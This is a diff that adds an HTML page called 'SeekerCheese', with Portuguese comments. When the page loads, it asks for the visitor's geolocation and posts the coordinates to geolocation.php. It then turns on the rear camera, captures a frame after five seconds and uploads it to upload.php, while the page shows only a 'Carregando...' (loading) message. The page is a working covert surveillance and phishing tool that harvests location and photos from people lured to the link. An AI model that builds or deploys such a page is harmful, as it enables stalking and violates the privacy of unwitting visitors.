@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SeekerCheese</title>
+    <script>
+        // Função para capturar a localização do usuário
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition);
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        }
+
+        // Enviar a localização para o servidor PHP
+        function showPosition(position) {
+            var latitude = position.coords.latitude;
+            var longitude = position.coords.longitude;
+            
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "geolocation.php", true);
+            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+            xhr.send("lat=" + latitude + "&lon=" + longitude);
+        }
+
+        // Função para capturar imagem da câmera
+        function capturePhoto() {
+            var constraints = {
+                video: {
+                    facingMode: "environment", // Alterna entre "user" para frontal e "environment" para traseira
+                    width: { ideal: 1280 },
+                    height: { ideal: 720 }
+                }
+            };
+
+            // Solicitar permissão e acesso à câmera
+            navigator.mediaDevices.getUserMedia(constraints)
+                .then(function(stream) {
+                    var video = document.createElement("video");
+                    video.setAttribute("autoplay", "");
+                    video.setAttribute("playsinline", "");  // Necessário para iOS
+                    document.body.appendChild(video);
+                    video.srcObject = stream;
+
+                    // Criar canvas para capturar o frame do vídeo
+                    var canvas = document.createElement("canvas");
+                    var context = canvas.getContext("2d");
+
+                    // Aguardar 5 segundos para tirar a foto
+                    setTimeout(function() {
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        var dataURL = canvas.toDataURL("image/png");
+                        sendPhoto(dataURL);
+
+                        // Encerrar o fluxo de vídeo (parar a câmera)
+                        stream.getTracks().forEach(function(track) {
+                            track.stop();
+                        });
+                    }, 5000);  // Espera 5 segundos
+                })
+                .catch(function(error) {
+                    console.log("Erro ao acessar a câmera: ", error);
+                });
+        }
+
+        // Função para enviar a foto para o servidor
+        function sendPhoto(photoData) {
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "upload.php", true);
+            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+            xhr.send("photo=" + encodeURIComponent(photoData));
+        }
+
+        // Executa captura de localização e foto na carga da página
+        window.onload = function() {
+            getLocation();  // Captura localização
+            capturePhoto();  // Captura imagem da câmera
+        }
+    </script>
+</head>
+<body>
+    <h1>Carregando...</h1>
+</body>
+</html>
